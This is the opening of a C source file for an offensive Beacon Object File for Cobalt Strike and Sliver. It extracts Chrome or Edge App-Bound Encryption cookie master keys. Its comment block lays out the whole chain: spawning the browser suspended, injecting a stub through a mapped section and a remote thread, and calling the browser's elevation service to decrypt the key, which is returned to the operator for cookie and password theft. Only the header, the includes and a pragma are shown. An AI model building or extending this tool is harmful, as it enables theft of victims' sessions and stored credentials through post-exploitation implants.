// abe.c: Chrome/Edge App-Bound Encryption key extraction BOF (x64).
//
// CS/Sliver-compatible BOF ABI. Key-only: returns the 32-byte AES-256-GCM
// cookie master key as base64. Cookie/password decryption happens operator
// side (or via the companion execute-assembly).
//
//   usage (Sliver):  abe [browser]     browser: 0=chrome (default), 1=edge
//
// Chain: App Paths -> browser exe | read Local State -> app_bound_encrypted_key
// -> base64 -> strip "APPB" -> (NO user-DPAPI: the M157 os_crypt_async
// format stores the service's SYSTEM-DPAPI blob directly; the elevator does
// its own unwrap after caller validation) -> spawn browser
// CREATE_SUSPENDED -> write PIC stub + params + candidates -> map section into
// target -> remote thread -> stub CoCreateInstance(IElevator*)->DecryptData
// inside the real browser process -> key lands in section -> terminate spawned
// process -> base64 out.
//
// Build: see build.bat. No CRT: all copying/decoding is hand-rolled so the
// COFF has no undefined CRT symbols the beacon loader cannot resolve.

#include <windows.h>
#include "abe_common.h"
#include "stub_blob.h" // generated by extract_stub.py from stub.obj

// force inline expansion, so no CRT libcall symbols appear in the COFF
#pragma intrinsic(memset, memcpy)

